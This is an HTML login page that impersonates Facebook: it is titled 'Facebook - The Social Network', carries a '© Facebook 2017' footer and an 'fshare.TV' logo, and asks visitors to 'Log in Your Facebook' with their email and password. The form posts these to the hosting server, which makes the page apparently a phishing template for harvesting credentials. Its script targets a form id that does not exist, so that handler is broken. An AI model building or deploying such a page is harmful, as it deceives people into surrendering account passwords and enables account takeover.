<!DOCTYPE html>
<html>
  <head>
    <title>Facebook - The Social Network</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/css/style.css" />
    <style>
      .login-form {
        background: rgba(255, 255, 255, 1);
        padding: 10% 20px;
        border-radius: 2px;
        box-shadow: 0px 0px 15px 5px rgba(0, 0, 0, 0.4);
      }
      .main {
        min-height: 100vh;
        padding: 10% 0px;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <div class="container-fluid">
        <div class="row">
          <div class="col-sm-9">
            <div class="logo">
              <h1>fshare.TV</h1>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="main">
      <div class="container-fluid">
        <div class="row">
          <div class="pull-left text-center col-sm-3"></div>
          <div class="pull-right col-sm-6 text-center">
            <div
              class="login-form"
              style="border-radius: 30px; border: #2d9a40 5px solid">
              <p class="h3">Log in Your Facebook</p>
              <form method="post" style="max-width: 400px; margin: 0px auto">
                <div class="form-group">
                  <input
                    type="text"
                    name="user_email"
                    placeholder="Email Address"
                    class="input-lg col-sm-12" />
                </div>
                <div class="form-group">
                  <input
                    type="password"
                    placeholder="New Password"
                    name="pwd"
                    class="input-lg col-sm-12" />
                </div>
                <div class="form-group">
                  <input
                    id="submit"
                    type="submit"
                    value="Login"
                    class="btn btn-success input-lg col-sm-12" />
                  <br /><br /><br /><br />
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="footer">
      <div class="container-fluid">
        <div class="row">
          <div class="col-sm-12">&copy; Facebook 2017.</div>
        </div>
      </div>
    </div>
    <script>
      document.getElementById("loginForm").onsubmit = (event) => {
        event.preventDefault();

        var formData = new FormData(event.target);

        fetch("/", {
          method: "POST",
          body: formData,
        })
          .then((response) => response.text())
          .then((text) => console.log(text))
          .catch((error) => console.log("Error:", error));
      };
    </script>
  </body>
</html>
